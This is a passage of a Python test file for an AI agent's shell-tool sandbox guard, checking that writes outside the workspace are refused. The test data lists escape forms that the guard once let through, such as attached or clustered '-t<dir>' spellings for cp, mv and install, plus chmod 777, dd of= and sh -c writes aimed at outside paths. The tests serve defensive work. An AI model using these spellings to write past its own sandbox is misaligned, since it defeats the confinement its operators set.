    assert _extract_write_targets(f"cp -S .bak x {OUTSIDE_TARGET}/c") == [
        f"{OUTSIDE_TARGET}/c"
    ]
    assert _check_sandbox(f"cp -s x {OUTSIDE_TARGET}/l", "read-only")[0] is False


def test_the_target_directory_is_read_in_every_spelling_getopt_accepts():
    """The `-t` spellings that ride in the same token, measured against GNU.

    Reading only the bare `-t` token is a fail-open that survives the spaced and
    the `=`-joined long form: an unnamed destination is an ALLOW at both tiers
    whatever it points at. The ground truth for the attached and clustered
    spellings is GNU's (BSD `cp`/`mv`/`ln` have no `-t`), measured in
    `debian:bookworm-slim` — every row below exits 0 there with the source in the
    named directory, in the same geometry this file uses.

    The last two assertions are the direction that must *not* move: a scan that
    read `-T` or `-S` as `-t` would name the source, so a legitimate copy to a
    path inside the workspace would be refused for being its own input.
    """
    for cmd in (
        f"cp x -t{OUTSIDE_TARGET}",
        f"mv x -t{OUTSIDE_TARGET}",
        f"ln -s x -t{OUTSIDE_TARGET}",
        f"install -m 644 x -t{OUTSIDE_TARGET}",
        f"cp -rt {OUTSIDE_TARGET} x",
        f"cp -rt{OUTSIDE_TARGET} x",
        f"install -Dt {OUTSIDE_TARGET} x",
        f"install -Dt{OUTSIDE_TARGET} x",
    ):
        assert _extract_write_targets(cmd) == [OUTSIDE_TARGET], cmd
        assert _check_sandbox(cmd, "read-only", workdir="/workspace")[0] is False, cmd
        assert _check_sandbox(cmd, "workspace-write", workdir="/workspace")[0] is False, cmd

    # `-T` is a *flag* and `-S` takes a suffix, so the letter after them is a value
    # or nothing — never a target directory. Both name their real destination.
    assert _extract_write_targets(f"cp -T x {OUTSIDE_TARGET}/dst") == [
        f"{OUTSIDE_TARGET}/dst"
    ]
    assert _extract_write_targets(f"cp -St x {OUTSIDE_TARGET}/dst") == [
        f"{OUTSIDE_TARGET}/dst"
    ]


# ── one mutation arm per verb: a row that cannot be killed is not a claim ──

# (row, the set the branch tests, the verb to drop, a command that row refuses)
MUTATION_ARMS = (
    ("touch", "_CREATING_VERBS", "touch", f"touch {OUTSIDE_TARGET}/t"),
    ("mkdir", "_CREATING_VERBS", "mkdir", f"mkdir {OUTSIDE_TARGET}/d"),
    ("ln", "_DESTINATION_LAST_VERBS", "ln", f"ln -s x {OUTSIDE_TARGET}/l"),
    ("cp", "_DESTINATION_LAST_VERBS", "cp", f"cp x {OUTSIDE_TARGET}/dst"),
    ("mv", "_DESTINATION_LAST_VERBS", "mv", f"mv x {OUTSIDE_TARGET}/m"),
    ("install", "_DESTINATION_LAST_VERBS", "install",
     f"install -m 644 x {OUTSIDE_TARGET}/i"),
    ("chmod", "_METADATA_VERBS", "chmod", f"chmod 777 {OUTSIDE_TARGET}/t"),
    ("chown", "_METADATA_VERBS", "chown", f"chown root {OUTSIDE_TARGET}/t"),
    ("chgrp", "_METADATA_VERBS", "chgrp", f"chgrp staff {OUTSIDE_TARGET}/t"),
    ("dd", "_dd_output_targets", "dd", f"dd if=/dev/zero of={OUTSIDE_TARGET}/d"),
    ("mkfifo", "_CREATING_VERBS", "mkfifo", f"mkfifo {OUTSIDE_TARGET}/f"),
    ("mknod", "_CREATING_VERBS", "mknod", f"mknod {OUTSIDE_TARGET}/n p"),
    ("link", "_DESTINATION_LAST_VERBS", "link", f"link x {OUTSIDE_TARGET}/l"),
    ("ditto", "_DESTINATION_LAST_VERBS", "ditto", f"ditto x {OUTSIDE_TARGET}/d"),
)


def test_each_row_is_killed_by_dropping_its_verb_from_the_walk():
    """A mutation arm per verb, because a row nothing can kill is not a claim.

    Each arm is applied to the module the walk really reads (the sets the branch
    tests, and for `dd` the helper that reads `of=`), then reverted. The row must
    be refused *before* the arm — otherwise the arm proves nothing — and allowed
    after it, which is the `ALLOW` master gave.
    """
    for row, name, verb, cmd in MUTATION_ARMS:
        assert _check_sandbox(cmd, "read-only", workdir="/workspace")[0] is False, row
        saved = getattr(bash_tool, name, None)
        if name == "_dd_output_targets":
            bash_tool._dd_output_targets = lambda *_a, **_k: []
        else:
            setattr(bash_tool, name, saved - {verb})
        try:
            allowed = _check_sandbox(cmd, "read-only", workdir="/workspace")[0]
        finally:
            if saved is None:
                del bash_tool._dd_output_targets
            else:
                setattr(bash_tool, name, saved)
        assert allowed is True, (
            f"the {row} row survives dropping {verb} from {name} - it does not "
            "depend on the branch it claims to test"
        )


def test_the_attached_spellings_are_killed_by_disabling_the_short_option_reader():
    """The `-t<dir>` / clustered rows, killed by the helper they rest on.

    A set-difference arm cannot reach these: the short forms are not read from the
    verb table (the reader already knows `-t` is the flag it is looking for — the
    table is only what tells it where a *cluster's* value-taking letters are). So
    the arm is the reader itself, replaced by one that answers `None`, and every
    attached spelling must go back to naming nothing — the ALLOW measured before
    the fix.
    """
    rows = (f"cp x -t{OUTSIDE_TARGET}", f"cp -rt {OUTSIDE_TARGET} x",
            f"install -Dt{OUTSIDE_TARGET} x")
    for cmd in rows:
        assert _check_sandbox(cmd, "read-only", workdir="/workspace")[0] is False, cmd
    saved = bash_tool._short_target_directory
    bash_tool._short_target_directory = lambda *_a, **_k: None
    try:
        for cmd in rows:
            targets = _extract_write_targets(cmd)
            # Without the reader the destination is gone from the walk: the attached
            # forms name nothing at all, and the clustered one falls back to the
            # last-operand rule, which names the *source* (`x`) instead.
            assert OUTSIDE_TARGET not in targets, (cmd, targets)
            assert (
                _check_sandbox(cmd, "workspace-write", workdir="/workspace")[0] is True
            ), (
                f"{cmd!r} is still refused without the short-option reader - the row "
                "does not depend on the spelling it claims to test"
            )
    finally:
        bash_tool._short_target_directory = saved


# ── ground truth: the refused form writes nothing, its control really writes ──
#
# One verb per spelling family, driven end to end through `BashTool.execute` in a
# tree THIS TEST creates (rant 2026-09-17T11:38:16: a negative test's safety must
# not rest on the guard it is testing). Each row is a pair: the outside form must
# be refused with nothing left behind, and the inside control must really write —
# otherwise "the walk names the path" would be a statement about a helper with
# nothing measuring whether the path was ever the real destination.
#
# `witness` says what to look at and where: a *file* the command would leave
# behind (asserted absent after the refusal, present after the control), or the
# *mode* of a file the test created (`chmod` leaves no new file, so the mode is its
# only observable).
GROUND_TRUTH_FAMILIES = (
    # (row, refused form, the file it would leave, kind, allowed form, its witness)
    ("touch", "touch {t}/refused.txt", "{t}/refused.txt", "file",
     "touch {w}/allowed.txt", "{w}/allowed.txt"),
    ("mkdir", "mkdir {t}/refused-dir", "{t}/refused-dir", "file",
     "mkdir {w}/allowed-dir", "{w}/allowed-dir"),
    ("ln -s", "ln -s x {t}/refused-link", "{t}/refused-link", "file",
     "ln -s x {w}/allowed-link", "{w}/allowed-link"),
    # `cp -t <dir> <src>` needs a source that is not already in `<dir>` (cp refuses
    # a file onto itself), so the source lives one level down in the workspace.
    ("cp -t", "cp -t {t} {w}/sub/source.txt", "{t}/source.txt", "file",
     "cp -t {w} {w}/sub/source.txt", "{w}/source.txt"),
    ("dd of=", "dd if=/dev/zero of={t}/refused.bin bs=1 count=1", "{t}/refused.bin",
     "file", "dd if=/dev/zero of={w}/allowed.bin bs=1 count=1", "{w}/allowed.bin"),
    ("chmod", "chmod 777 {t}/locked.txt", "{t}/locked.txt", "mode",
     "chmod 777 {w}/locked.txt", "{w}/locked.txt"),
    ("install -d", "install -d {t}/refused-dir", "{t}/refused-dir", "file",
     "install -d {w}/allowed-dir", "{w}/allowed-dir"),
    ("sh -c touch", "sh -c 'touch {t}/refused.txt'", "{t}/refused.txt", "file",
     "sh -c 'touch {w}/allowed.txt'", "{w}/allowed.txt"),
    ("mkfifo", "mkfifo {t}/refused.fifo", "{t}/refused.fifo", "file",
     "mkfifo {w}/allowed.fifo", "{w}/allowed.fifo"),
    ("mknod", "mknod {t}/refused.node p", "{t}/refused.node", "file",
     "mknod {w}/allowed.node p", "{w}/allowed.node"),
    ("link", "link {w}/sub/source.txt {t}/refused-link", "{t}/refused-link", "file",
     "link {w}/sub/source.txt {w}/allowed-link", "{w}/allowed-link"),
    # The `-t` spellings that ride in one token. Their *control* is GNU-only (BSD
    # rejects the flag), which the row's own premise check handles; the refusal is
    # measurable everywhere because the guard answers before the shell is reached.
    # The option leads for a measured reason: BSD `cp` does not permute, so
    # `cp <src> -t<dir>` there is not "an illegal option" at all — it copies the
    # source to a file *named* `-t<dir>`, which would let the control look green
    # while the flag was never understood. Option-first makes the platform reject
    # the flag it does not have, which is the premise this check can see.
    ("cp -t attached", "cp -t{t} {w}/sub/source.txt", "{t}/source.txt", "file",
     "cp -t{w} {w}/sub/source.txt", "{w}/source.txt"),
    ("cp -rt cluster", "cp -rt{t} {w}/sub/source.txt", "{t}/source.txt", "file",
     "cp -rt{w} {w}/sub/source.txt", "{w}/source.txt"),
)


def _tool_refused_the_flag_itself(result) -> bool:
    """True when the *shell* rejected the form rather than the guard the write.

    `-t` is GNU coreutils: BSD `cp`/`mv`/`ln` (what macOS ships) answer `illegal
    option -- t`, and cmd.exe has no such flag at all — so on those platforms the
    control cannot write however the walk behaves, and the row's ground truth is
    unmeasurable rather than green or red. The signal is the tool's own stderr, and
    a *guard* refusal is excluded by its own words ("not executed"), which is what
    keeps this from swallowing a real over-block. It is read from the output and not
    from `result.error`, because a non-zero exit is not flagged as an error (measured:
    `cp -t` exits 64 and reports `error=False`).
    """
    if "not executed" in result.content:
        return False
    lowered = result.content.lower()
    return (
        "illegal option" in lowered
        or "invalid option" in lowered
        or "usage:" in lowered
    )


@pytest.mark.skipif(
    sys.platform == "win32",
    reason="POSIX shell ground truth: the daemon's shell on Windows is cmd.exe, "
           "where `touch`, `ln`, `dd` and `install` are not commands at all",
)
@pytest.mark.parametrize(
    "row,refused,refused_witness,witness,allowed,allowed_witness",
    GROUND_TRUTH_FAMILIES,
    ids=[row for row, *_rest in GROUND_TRUTH_FAMILIES],
)
def test_the_refused_writer_writes_nothing_and_its_control_really_writes(
    monkeypatch, tmp_path, row, refused, refused_witness, witness, allowed,
    allowed_witness,
):
    """Issue #1398 acceptance 4, including the premise the pair rests on.

    `tmp_path` sits inside the OS temp root, which workspace-write legitimately
    allows — so `gettempdir` is patched to a name no directory here has, and the
    outside tree is a sibling of the workspace rather than something under the temp
    root. Without that patch the refusal would be about the *temp root* and would
    pass for the wrong reason (the same trap the existing
    `test_execute_workspace_write_blocks_a_write_outside_the_workspace` names).
    """
    import shutil as _shutil
    import stat as _stat
    import tempfile as _tf

    if row == "install -d" and _shutil.which("install") is None:
        pytest.skip("`install` is not on PATH here, so this ground truth is unmeasurable")
    _verb = row.split()[0]
    if _verb in ("mkfifo", "mknod", "link") and _shutil.which(_verb) is None:
        pytest.skip(
            f"`{_verb}` is not on PATH here, so this ground truth is unmeasurable"
        )

    monkeypatch.setattr(_tf, "gettempdir", lambda: "/fake-os-temp")
    workspace = tmp_path / "ws"
    (workspace / "sub").mkdir(parents=True)
    outside = tmp_path / "outside"          # a sibling of the workspace
    outside.mkdir()

    # The premises the *test* builds: the copy source, and the file whose mode is
    # the witness for the `chmod` row. None of this is produced by the guard.
    (workspace / "sub" / "source.txt").write_text("x", encoding="utf-8")
    (outside / "locked.txt").write_text("x", encoding="utf-8")
    (workspace / "locked.txt").write_text("x", encoding="utf-8")
    os.chmod(outside / "locked.txt", 0o644)
    os.chmod(workspace / "locked.txt", 0o644)

    def path(template: str):
        return template.format(t=outside.as_posix(), w=workspace.as_posix())

    tool = BashTool()

    # The refusal comes first because it is the half every platform can measure: the
    # guard answers before the shell ever sees the command, so even on a platform
    # whose tool has no `-t` (BSD coreutils, macOS) the walk's half of the row is a
    # real measurement — it is the *control* that needs the flag to exist.
    result = _run(tool.execute({
        "command": path(refused),
        "sandbox": "workspace-write",
        "workdir": str(workspace),
    }))
    assert result.error is True, f"{path(refused)!r} was not refused"
    assert "not executed" in result.content
    assert "enforcement=partial" in result.content, (
        "the honest `partial` label must stay on the refusal itself, not only in "
        "the docstring (issue #1398 acceptance 5)"
    )
    if witness == "file":
        # `lexists`, not `exists`, in both directions: `ln -s x <target>` leaves a
        # *dangling* symlink, which `exists` cannot see — so the refusal would look
        # clean even if it had written, and the control would look empty although it
        # had written.
        assert not os.path.lexists(path(refused_witness)), (
            f"{path(refused)!r} really wrote {path(refused_witness)!r} outside the "
            "workspace"
        )
    else:
        assert _stat.S_IMODE(os.stat(path(refused_witness)).st_mode) == 0o644, (
            f"{path(refused)!r} changed the mode of a file outside the workspace"
        )

    # The control carries the row's *premise*: `-t` is GNU coreutils, and BSD
    # `cp`/`mv`/`ln` answer `illegal option -- t`, so where the tool has no such flag
    # the control cannot write however the walk behaves and the half is unmeasurable
    # rather than green or red. The distinction is read from what the shell said,
    # never from the platform name.
    control = _run(tool.execute({
        "command": path(allowed),
        "sandbox": "workspace-write",
        "workdir": str(workspace),
    }))
    if _tool_refused_the_flag_itself(control):
        pytest.skip(
            f"{path(allowed)!r} is not a form this platform's tool understands "
            f"({control.content.strip().splitlines()[-1][:60]}), so the control half "
            "of this row cannot be measured here"
        )

    assert control.error is not True, (
        f"the control {path(allowed)!r} was refused: {control.content}"
    )
    if witness == "file":
        assert os.path.lexists(path(allowed_witness)), (
            f"the control {path(allowed)!r} really wrote nothing, so the refusal "
            "above was not the difference: re-measure the row"
        )
    else:
        assert _stat.S_IMODE(os.stat(path(allowed_witness)).st_mode) == 0o777, (
            f"the control {path(allowed)!r} did not change the mode it names"
        )

